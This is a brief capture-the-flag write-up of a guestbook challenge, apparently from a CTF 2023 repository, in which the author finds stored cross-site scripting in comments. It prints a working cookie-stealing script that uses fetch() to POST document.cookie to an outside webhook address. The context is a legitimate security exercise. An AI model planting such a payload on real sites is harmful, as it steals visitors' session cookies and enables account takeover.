# 1 - My GuestBook 

## [Come Back to README](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/README.md)

## Solve

Let's go:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/1.png)

First I saw that page and I've tried if i can do xss inside comments:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/2.png)

It worked!

So I did grab that js xss cookie stealer:

```
</u>
<script>
	fetch('https://webhook.site/591c#$@#-#$@#-#$%^-#$%^-!@#$366d@#$@/cockie',
  {method:'POST', mode:'no-cors', body: document.cookie});
</script>
```

and I did post it in the comments section... then waited for an full hour 

and did get a flag:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/3.png)

It was just url encoded so I've decoded it

and I did report that flag to the bot:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/4.png)

## By The Way

Everyone had same page so everyone could learn something from other's or get rick rolled, noice bwoyz!

I've never had so much fun like on that challange

## [Come Back to README](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/README.md)